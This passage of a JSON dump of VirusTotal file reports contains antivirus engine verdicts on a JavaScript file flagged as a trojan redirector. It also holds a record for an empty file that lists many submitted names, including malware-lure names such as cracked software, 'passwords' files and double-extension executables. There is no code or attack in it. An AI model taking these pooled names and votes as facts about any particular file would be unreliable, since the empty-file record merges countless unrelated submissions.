          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Trojan.JS.Agent.505161",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-10-06.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Emsisoft": {
          "category": "timeout",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": "Malware.HTML/ExpKit.Gen2",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.JS.Agent.UUM",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "McAfee-GW-Edition": {
          "category": "timeout",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.3.0.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230705"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.91",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230907"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231006-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "HTML/ExpKit.Gen2",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "2023.8.30.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Microsoft": {
          "category": "timeout",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23090.2007",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.142.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36060",
          "result": "TrojWare.JS.Agent.JM@4wlb1m",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.JS.Agent.UUM [many]",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36612B:27.33398",
          "result": "Trojan.JS.Agent.UUM (2x)",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1696590079",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230921"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": "Trojan/JS.Redirector.SC187901",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230928"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=83)",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Trojan.Redirector!8.E (TOPIS:E0:F02q522yzBV)",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.JS.IFrame",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.W32.cryxos.11318",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "JS/Decode.AUY!tr",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "JS:Redirector-CCQ [Trj]",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230927"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": null
        }
      }
    },
    "type": "file",
    "id": "321ccd58cd40f4de982212f598e86530e104de38f3091c943ec0f75c3340e984",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/321ccd58cd40f4de982212f598e86530e104de38f3091c943ec0f75c3340e984"
    }
  }
},
{
  "_id": {
    "$oid": "65b5016635757fba8f94de17"
  },
  "data": {
    "attributes": {
      "type_description": "unknown",
      "tlsh": "TNULL",
      "type_tags": [],
      "nsrl_info": {
        "products": [
          "DRAW (Corel Corporation)",
          "Photo-Paint (Corel Corporation)",
          "Commerce Server Developer Edition (Microsoft)",
          "Exchange Server Enterprise Edition (Microsoft)",
          "eMbedded Visual Tools (Microsoft)",
          "Internet Security and Acceleration Server - Enterprise Edition (Microsoft)",
          "Commerce Server - Developer Edition (Microsoft)",
          "Linux (Corel Corporation)",
          "Yourideallink.com (Ideal link Inc.)",
          "NSRL Test (NIST)",
          "Visio (Microsoft)",
          "Visio Enterprise Edition (Microsoft)",
          "EarthLink (Earthlink Inc.)",
          "Riven (Red Orb)",
          "Quicken (Intuit Inc.)",
          "Get Set to Learn (Creative Wonders)",
          "MySQL (NuSphere Corporation)",
          "Windows (Microsoft)",
          "QuickBooks (Intuit Inc.)",
          "Tivoli Manager (Tivoli)"
        ],
        "filenames": [
          "1, Augustin, Butterfield, Cook, Copperplate Gothic (1, Copperplate Gothic (8, Drummer, Erickson, Eurostile (1, Eurostile 2 (3, FJSV, FMI, Flynn, Gorman, Holmes, Ivey, Jirik, Koval, Lovitz, MAHJONGG.{EASY, Met Turn, Midstokke, NATE, Nipstad, Oak, Papenfuss, Quigley, Rada, Ross, SUNW, Schue, Sorry, TI, Thuen, Uglem, Univers (1-5, Univers Condensed (2, Vorhees, Wicker, Xanadu, Yaeger, Zimmerman, btmgr.spec, nasm.vim, sunw",
          "iesetup.dir",
          "BLANK.TXT, blogo.gi!, blogo.gi_",
          "ROUTE.TBL",
          "BLANK DOCUMENT.PSW, BLANK NOTE.PWI, CD1.INF, FILEOSP.RC, chat.adm",
          "cdrom_sp.tst",
          ".FVWM95, .FVWM95RC, .TEXTSWRC, .TEXT_EXTRAS_MENU, .TTYSWRC, ADDGROUP, ANSI, AWK, AWK.1, CAPTOINFO, CBB-MAN, COMPILED, CONFIG, DIGITAL, DUMB, DYNALOADER, EDITOR, EDITOR.1, FDLIST, FDMOUNT.CONF, FDMOUNTD, FDUMOUNT, FUJITSU, GENKSYMS, INFOTOCAP, INIT-RESTART.HOOK, INIT.HOOK, IO, IO.BS, LASTB, LD-LINUX.000, LD-LINUX.SO, LIBAPT-PKG.001, LIBAPT-PKG.SO, LIBATTRGLYPH.001, LIBATTRGLYPH.SO, LIBATTRIBUTE.001, LIBATTRIBUTE.SO, LIBBROKENLOCALE.SO, LIBC.SO, LIBCOMGLYPH.001, LIBCOMGLYPH.SO, LIBCOMTERP.001, LIBCOMTERP.SO, LIBCOMUNIDRAW.001, LIBCOMUNIDRAW.SO, LIBCOMUTIL.001, LIBCOMUTIL.SO, LIBCOM_ERR.000, LIBCRYPT.SO, LIBDB.SO, LIBDL.000, LIBDL.SO, LIBDND++.SO, LIBDND.SO, LIBDPKG.000, LIBDPKG.001, LIBDRAWSERV.001, LIBDRAWSERV.SO, LIBE2P.000, LIBEXT2FS.000, LIBFORM.000, LIBFRAMEUNIDRAW.001, LIBFRAMEUNIDRAW.SO, LIBGDBM.000, LIBGDBM.001, LIBGIF.000, LIBGIF.SO, LIBGRAPHUNIDRAW.001, LIBGRAPHUNIDRAW.SO, LIBHISTORY.000, LIBICE.001, LIBICE.SO, LIBIV-COMMON.001, LIBIV-COMMON.SO, LIBIV.001, LIBIV.SO, LIBIVGLYPH.001, LIBIVGLYPH.SO, LIBJPEG.000, LIBJPEG.SO, LIBM.SO, LIBMAGICK.SO, LIBMENU.000, LIBMRM.001, LIBMRM.SO, LIBNSL.SO, LIBNSS_COMPAT.SO, LIBNSS_DB.SO, LIBNSS_DNS.SO, LIBNSS_FILES.SO, LIBNSS_NIS.SO, LIBOLGX.SO, LIBOVERLAYUNIDRAW.001, LIBOVERLAYUNIDRAW.SO, LIBPANEL.000, LIBPEX5.001, LIBPEX5.SO, LIBPTHREAD.SO, LIBQT.001, LIBQT.SO, LIBRESOLV.SO, LIBSLANG.000, LIBSM.001, LIBSM.SO, LIBSS.000, LIBSTDC++-LIBC6.0-1, LIBSTDC++-LIBC6.1-1, LIBSTDC++.001, LIBSTDC++.SO, LIBTIFF.SO, LIBTIME.001, LIBTIME.SO, LIBTOPOFACE.001, LIBTOPOFACE.SO, LIBUNGIF.SO, LIBUNIDRAW-COMMON.001, LIBUNIDRAW-COMMON.SO, LIBUNIDRAW.001, LIBUNIDRAW.SO, LIBUNIIDRAW.001, LIBUNIIDRAW.SO, LIBUTIL.SO, LIBUUID.000, LIBWRASTER.SO, LIBWXGRID_XT.SO, LIBWXTAB_XT.SO, LIBWX_XT.SO, LIBWX_XTTHREAD.SO, LIBWX_XTWIDGETS.SO, LIBX11.001, LIBX11.SO, LIBXAW.001, LIBXAW.SO, LIBXAW3D.001, LIBXAW3D.SO, LIBXEXT.001, LIBXEXT.SO, LIBXI.001, LIBXI.SO, LIBXIE.001, LIBXIE.SO, LIBXM.001, LIBXM.SO, LIBXMU.001, LIBXMU.SO, LIBXP.001, LIBXP.SO, LIBXPM.000, LIBXPM.SO, LIBXT.001, LIBXT.SO, LIBXTST.001, LIBXTST.SO, LIBXVIEW.SO, LIBZ.001, LIBZ.SO, LOCALE.ALIAS, MACINTOSH, MAIN-MENU-PRE.HOOK, MAIN-MENU.HOOK, MENUDEFS.HOOK, NAWK, NAWK.1, NEC, NEWXSERVER.XSERVER-VGA16, PAGER, PIDOF, POST.HOOK, POWEROFF, RAMSIZE, RBASH, RCLOCK, REBOOT, RESET, RMMOD, ROOTFLAGS, RXVT, RXVT-M, SCREEN, SCREEN-W, SECURITYPOLICY, SG, SGI, SHELLTOOL, SOCKET, SOCKET.BS, SONY, SUN, SWAPDEV, SWAPOFF, TABSET, TELINIT, TERMINFO, VI.1, VIDMODE, VIGR, VT100, VT102, VT220, VT52, W.1, X11R6, XDFFORMAT, XDM-CONFIG, XDVI, XF86CONFIG, XFTP, XINITRC, XKBCOMP, XSCREENSAVER, XSERVERRC, XSETBG, XSYSINFO, XTERM, XTERM-DEBIAN, XTERM-XFREE86",
          "rfc779.htm",
          "test1.txt, test1.z",
          "INSTALL.LOG",
          "Drafts, Inbox, Sent, Templates, Trash, Unsent_Messages, blogo.gi!, blogo.gi_, ns45_drafts, ns45_inbox, ns45_sent, ns45_templates, ns45_trash, ns45_unsent_messages, phonepref.txt",
          "MSDN332.INF",
          "PREFREPT.BMP, PREFRPT2.BMP, PREFSMOD.BMP, PREFSWIN.BMP, PROGGRP1.BMP, PROGGRP2.BMP, PROGRUN.BMP, QCARD01.BMP, QCARD06.BMP, UGCHAP9.BMP",
          "BD.CON, BF.CON, BG.CON, BL.CON, BN.CON, BNCON.WRI, CC.CON, CD.CON, DISK1, DISK2, DISK3, WOW.DRV",
          ".exists, API.bs, B.bs, Base64.bs, ByteLoader.bs, ChangeNotify.bs, Clipboard.bs, Console.bs, DBI.bs, DB_File.bs, DProf.bs, Dumper.bs, Embperl.bs, Event.bs, EventLog.bs, Fcntl.bs, FileSecurity.bs, GDBM_File.bs, Glob.bs, Hostname.bs, IO.bs, IPC.bs, Internet.bs, Leak.bs, MD2.bs, MD5.bs, Mutex.bs, NDBM_File.bs, Net.bs, NetAdmin.bs, NetResource.bs, ODBC.bs, ODBM_File.bs, OLE.bs, Opcode.bs, Oracle.bs, POSIX.bs, Peek.bs, PerfLib.bs, Pipe.bs, Process.bs, Registry.bs, SDBM_File.bs, SHA1.bs, Semaphore.bs, Service.bs, Shortcut.bs, Socket.bs, Sound.bs, Storable.bs, Symbol.bs, SysV.bs, Syslog.bs, Thread.bs, Win32.bs, WinError.bs, attrs.bs, carts.MYD, columns_priv.MYD, comments, host.MYD, images.MYD, mail, mrbs_entry.MYD, mrbs_repeat.MYD, mysql.bs, nomail, sessions.MYD, tables_priv.MYD, users.MYD, zlib.bs",
          "empty.htm, logagent.exe, quartz.dll, tvxdup.001, vnetsup.vxd, xeno.avb",
          "blogo.gi!, blogo.gi_",
          "MessagesD.properties, MessagesF.properties, MessagesJA.properties, access_log",
          "CUSTOMERSERVICE.RESX, CUSTOMERSERVICES.CUSTOMERSERVICE.RESOURCES, DEFAULT.ASPX.RESX, EXCEPTIONHANDLING.EXCEPTIONHANDLINGFORM.RESOURCES, EXCEPTIONHANDLINGFORM.RESX, FRMPOORUPGRADE.RESX, GLOBAL.ASAX.RESX, LOGIN.ASPX.RESX, MAINFORM.RESX, MOBILEWEBFORM1.ASPX.RESX, README.ASPX.RESX, SERVICE.LCK, SERVICE1.ASMX.RESX, VB6POOREXAMPLE.FRMPOORUPGRADE.RESOURCES, WEBAPPLICATION3.GLOBAL.RESOURCES, WEBAPPLICATION3.WEBFORM1.RESOURCES, _11EVENTLOGGINGDEMO.README.RESOURCES, _MYHEADER.ASCX.RESX",
          "DECSCSI, DISK1, DISK103, PLANGEOAREA.BCP, SPCDROM.40, TAGFILE.1"
        ]
      },
      "names": [
        "The Long Dark.exe",
        "A91vx7ju1_yv5zrg_1uk.tmp",
        "udtsmdfz.tmp",
        "A9vjl576_1o402yf_9g.tmp",
        "A91vwlsub_1wzzh4u_rg.tmp",
        "Passwords.txt",
        "_uninsep.bat",
        "netcore,Aigio.Avalonia.AppCenter.Analytics",
        "HidePlugin.dll",
        "Adobe.Photoshop.2023.u11.Multilingual.iso",
        "setup.exe",
        "swedish horse lesbian sleeping fishy .zip.exe",
        "ДОСТУПЫ.txt",
        "aimp4_2023-11-20 22_14_21.exe",
        "AkrienBetaLoader.exe",
        "웅장한 게임 삽입곡 느낌  Alan Walker  The Drum 가사해석자막lyrics.mp3",
        "Alexandros 철새 MV.mp3",
        "나의 히어로 아카데미아 2기 1쿨 OP 요네즈 켄시  피스 사인Peace Sign 가사발음.mp3",
        "Rain  Sid 가사포함 강철의 연금술사 리메이크 Fullmetar alchemist remake opening5.mp3",
        "japanese action catfight femdom  (Janette).zip.exe",
        "hellu.bmp",
        "setupABCAutoCategoriaB.exe",
        "897795840 Samael",
        "A9qchqhm_1jsv5ox_1ic.tmp",
        "A913ptht6_4tpp88_138.tmp",
        "website.ico",
        "A9orqehl_14112ia_1z0.tmp",
        "A9m2ccm1_1i5nfdh_1wc.tmp",
        "unins000.dat",
        "A9509oa6_lro2c8_hw.tmp",
        "A91bzmss3_b4lah8_114.tmp",
        "СНЕАТ(ПАРОЛЬ 123).exe",
        "A913feplb_1u762sl_1pw.tmp",
        "stats.ini",
        "zip password 123",
        "Dying Light Manager.Exe",
        "readme.txt",
        "FireflyAI.exe",
        "A91u6xoks_12wvsk5_22o.tmp",
        "A9xzkkh8_1aehyk3_l8.tmp",
        "safetyserver.exe",
        "xtx9vKm4.htm",
        "wft-unlock.1sc",
        "wft.bt",
        "Pirate_informatique_darkino.com.rar",
        "GTA IV RSC Manager 0.5.exe",
        "autorun.inf",
        "spools.exe",
        "Fear & Hunger 2 Termina",
        "locales",
        "partner-custom-asset.png",
        "509.exe",
        "A951x5di_zhlduh_1gc.tmp",
        "A98mmv0z_1ruh72t_1ys.tmp",
        "output.18271265.txt",
        "A9vrliv_1g7lov2_yw.tmp",
        "Desktop.dat",
        "hints.csv",
        "A913yep2o_2z7d25_2ag.tmp",
        "A91mm2eor_5xc5ha_d4.tmp",
        "A91dn2bic_aaw6f7_1jk.tmp",
        "A991elao_11dvaez_27w.tmp",
        "1403p[1].htm",
        "System.Threading.Tasks.Extensions, Version=4.2.0.1, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51",
        "apps.crx",
        "A91i7fijc_1b2jexh_25s.tmp",
        "A91tx6wgj_1htwht6_1s4.tmp",
        "A9j9a7d5_1ebzgqq_1p0.tmp",
        "A91p4sm47_1f3wmmy_2bc.tmp",
        "A91ugizil_c06f8p_2c8.tmp",
        "A9hzj2bn_vjyv3a_1b0.tmp",
        "A9vkifl6_u5ifig_1bg.tmp",
        "65529978.ini",
        "A91fvez30_n914hu_11s.tmp",
        "002c682abbdb81255cd5eaba4dfc6a1709100fe84a07ac58efc906bc441b0b0a.exe.exe",
        "A9t2ts7r_9e7rbd_r4.tmp",
        "G1ZNRZ8S.htm",
        "FRoulette.exe",
        "A98rt4sp_1lyj9h9_1b8.tmp",
        "A9uer7du_10i6yml_2ao.tmp",
        "INV0ICE.5358518.htm",
        "A91sv3ip1_1fknlc8_228.tmp",
        "Windows Loader.exe",
        "A91vrq0q2_j9mm9o_yw.tmp",
        "A9w11pu3_115lhj_98.tmp",
        "A91kn0707_1frexz6_1ag.tmp",
        "A915qnld1_1tqnm7_1do.tmp",
        "VMware Workstation Pro 17.0.0 Rus by AlexYar.exe",
        "netcore,static",
        "98wugf56[1]",
        "A91bhi7wi_b2gnae_16k.tmp",
        "A9oqmwmp_f5d7kz_15k.tmp",
        "ftp33.dll",
        "A91yxxfib_jg09fh_1q8.tmp",
        "A9cu5ttd_48194c_ok.tmp",
        "A91bhfxro_1pgxb5i_xc.tmp",
        "A9um60l_7e2vsb_1xs.tmp"
      ],
      "last_modification_date": 1706360863,
      "times_submitted": 933275,
      "size": 0,
      "total_votes": {
        "harmless": 8451,
        "malicious": 2364
      },
      "last_submission_date": 1706360863,
      "known_distributors": {
        "filenames": [
          "stub32i.exe                                                 -0bf48b2b5cf2a88226358d9bf7b3d00333559306760bd555058b0168d8bc89c0",
          "qdds.dll-7f542b5d1ce1a5c5c75a016e031c4c245ef43c75a2be5fc26d96f88db77b84e4",
          "666db2d1546c3ac1bb524a058e5350fc8c197cb167104e4ff1b13e572deff0bd",
          "Siemens.Siport.Common.TestHelper.dll.lastcodeanalysissucceeded",
          "system.data.sqlxml.resources.dll-47591a755d33d49c2cd13d70b702f26e2042ce39862c5acbbce75e971b7b32b3",
          "DSE_dialog.ps1",
          "50b0a47de5aa86a7926ea2b21403833a323840b4a3829f045a43fd8bb3545290",
          "stub32i.exe                                                 -03a6f6c6a74c039afa1763acd47694a708bb6ac5978fb490f9a7b4f30a3b6a1e",
          "9fff6daf-eafb-4e35-91d1-39205be4e6e0",
          "monitor.h",
          "fbx64.efi.signed-8cab6b56337f82a09300d6a140a473b6279593d26d698b05e5ed4e7b7a969570",
          "3com.h",
          "485de75f40ece6b228d12240549483d3550a6a6d94525377bfd42ac8b4fb6382",
          "streamlistener.rb-1767eca0247619db3854764df2ca8baacc2bd47c0e8c0f037e687489ca4b2475",
          "si8_fifo.c",
          "20-grubby.install-e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
          "9fd1ca0b-3a99-4773-917b-63439a2951f6",
          "hpsoftpaqwrapper.exe-fc5f37367f40d885c05ddb743db663b52050a0e5013b7e0d88c73f6bff06d451",
          "9f9f5312-8d34-4b13-84b9-f488e06712ae",
          "da903x.h",
          "mpw-gateway-wrapper-service.err.log",
          "RunPowershell.vbs",
          "stobject.dll-1fbb3a2467832340b0987db3d3519c66f29e1309454e2af21796fbff98b3a586",
          "install.exe-ad18fcd479609dfa41d79225fb31021054b34e9961d23017bf142ee9af74a120",
          "7c0f98e68c7c436ceceaa421dd09e39a7af8020d9f713ca7669aab1ec734fcbc",
          "policy.8.1.Altiris.Common.UI.dll-c95a065b9115ec14774c80373fec4b9b9e324c8c52fea1e3954f1b772b74ef67",
          "expressvpn_3.10.0.9-beta_i386.deb",
          "Siemens.Siport.LockerService.exe.lastcodeanalysissucceeded",
          "AGXFirmwareKextRTBuddy64-77e83e1bbbd1a1041c7c2e3117e0ebd53ebf1bf002920cd9bac609826d093e00",
          "expressvpn_3.10.0.9-1_armhf.deb",
          "svml_dispmd.dll-7bef46829d17d8d0e8eac2003dd94b25f28b126de470f1369320f9e54576a683",
          "expressvpn-3.10.0.9-beta.x86_64.rpm",
          "Photos-ce0a09259d6324ad6825024497ea538b761674a1529333fcf7c461c2caf3abf1",
          "expressvpn-3.10.0.9-beta-x86_64.pkg.tar.xz",
          "systemreset.exe.mui-e3bb9a3be06ef39009db7e74408b86c38ce497adb668866ff299150ec529631c",
          "32.h",
          "9f5c2cce-13d6-4b70-814d-ec7e1106be04",
          "7f2c72b0b972e850cf67a82d402e31ea2a5653a9fa68cd9b65047b4ad11a54f7",
          "slcsii64.dll-a40995a7c2bcc57a9734c68ae002286c4e9bf44563c2058d8896387b178ed462",
          "60e1b14f486c394b03a5c0f8c3144e33b5fd076d7f287ff8cf10d5fed0226bf4",
          "9f33f224-e31e-4bfc-98af-a9dd19fb46e2",
          "sysglobl.resources.dll-aaf2d4db1f04196f0b5ec0cabd6f4dbbb32ad6c5032cea67a9de2aa06be88152",
          "\u0001\u0001",
          "sltech64.dll-59d54ce7a24ab72e85d313a19262e52e48aa3a382fc43a6eefebd602df4459d6",
          "5d53eac41c5c63b5af3c81e8de56687f0bf4b38e942837a7b60030dd37963742",
          "main.css",
          "stub32i.exe                                                 -e22c0b45c667988c8c773af0262e3b60e92976143a60368ff997efade60d04ab",
          "FileSyncTelemetryExtensions.dll-ae4c45b9d7070ab44a8703a8bca02ab53a64a381f039323b09b290dbee44ebf0",
          "sltech32.dll-11f7b636b5da615325d8b63cf29d7ae06cb53dd6bc556f01575a3b16acb9354b",
          "vs_setup_bootstrapper.exe-25e51581c72214949ae9f8d95239171be7dbf5e54770e87289f8d6df162b4384",
          "pp.dll-5c8ccd7a7c4e045b186a1d13aa6a89747b7f4956289dc0ddd3e26afb493e63fe",
          "ScheduledTask_DialogTrigger.xml",
          "AM_Delta_Patch_1.403.1725.0.exe-787c908663d9661435ab023b533c1373f0f383bc3434a8ceccd4dfbaaa9ccddb",
          "sc92031.h",
          "9fdd526e-5129-4753-afa6-ef92c9b9749f",
          "9fedb224-bf78-4a38-b7a7-87d64ff2c091",
          "0000001102019395.pak-e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
          "msrdcw.resources.dll-999ccfc0dff6c57e828f66633b4097e6ed60273f62e6f6f030305ad06b0591ed",
          "9f13b694-0b01-4d0b-aaf8-d07c62912d3c",
          "4ce11e99ef4fe3b259e0bc1ae9ecc82ec724e537be7eab0716dc6ef5e8f47250",
          "bulkusb.bmf",
          "jquery.ui.datepicker.regional.js",
          "FileSync.LocalizedResources.dll.mui.MUI-e6b172635da431746b355e64f9dc061224cc7ed923bf0371d0449cd4d5279965",
          "ltc3676.h",
          "Siemens.Siport.Common.dll.lastcodeanalysissucceeded",
          "hpsoftpaqwrapper.exe-fd36ad6058183d16ec9cc97488498b44b69ade376c2ae6523c7150be40d49222",
          "prcs32.exe-70e075cb1ec4bdf0a952c2d3d292ecaaf1cbfddb0f5bdf30c3479521554d8a71",
          "system.xml.resources.dll-a8413538eba2b4a10e0bf6ba01c6f18483c96b3ec557f6f4f7221f105d78d6ff",
          "internetAccountsMigrator-49f66c52191c980f77e37a13805ae0d435a24d4e93c021632ad787904e1ab88f",
          "vietool.exe-e3444c771cafe93bb2666990108bd216212c2bb4c8b923a5dd95158b00700af8",
          "rotatelogs.exe-7cd4ec84b2ee92e338d4b290d9128c80caae117374c7c440bfbe47a83c741943",
          "GoogleUpdateSetup.exe-93c6cc759757abd4af17a57b59812e1be23d47cc750464ba152c4a2a040ef9f1",
          "9f1d612c-077f-44e1-bb4c-95e4380fbb29",
          "6e7b8c38f6514c586a92cfa3a9149f522007a3bca0c8bc711b972678c1400088",
          "66aa9e8b3a049566950d5154f4b7b25e3e2f7043bfccd39a0f35be1073f32a12",
          "rgsender_gui.exe-21f89e4a4204d7a91b2c87dddd3188e64f334eb8231a9846748ec0f6d962546e",
          "msi.h",
          "\u0001",
          "{F3225FA7-7989-4EF5-8E7B-81952DCC0E9F}",
          "cteng_index.lck",
          "goku.h",
          "scriptreplay-6ab31673f9709d5926bdda4088663b0d134a333b4e28ccedede3eefa98f2b67c",
          "nestedMasterDetail.theme.css",
          "hpsoftpaqwrapper.exe-fddab04ea9cb4e08278c3e004dd3712527eccc9d1763ec95a216b1225b136780",
          "expressvpn_3.10.0.9-beta_armhf.deb",
          "9f438706-d713-4351-8ee7-6a461ca86e81",
          "tuMCFPlg.dll-6e352d0de058882a7db46b9b791d409b81117a0dd3188fba4d8688631123c8d7",
          "GATDirectConnect.dll.lastcodeanalysissucceeded",
          "stub32i.exe                                                 -0bf48b2b5cf2a88226358d9bf7b3d00333559306760bd555058b0168d8bc89c0-e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
          "AM_Delta_Patch_1.403.902.0.exe-be5300159086dcdb24a86be6adebbdb8c92ebb085f4ef19da083a36517038769",
          "select2_locale.js",
          "receive_data.txt",
          "expressvpn-3.10.0.9-1-x86_64.pkg.tar.xz",
          "AdminApplyAgentsConfiguration.aspx",
          "pp.dll-5c8ccd7a7c4e045b186a1d13aa6a89747b7f4956289dc0ddd3e26afb493e63fe-e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
          "USB_Write_Enforcer.ps1",
          "hpsoftpaqwrapper.exe-ffdf807f29ec54abb4675cad7aa6bcb0439cf63d6150d9aa7a55e0f0c2bc7981",
          "bsglib.h",
          "expressvpn-3.10.0.9-beta.i386.rpm",
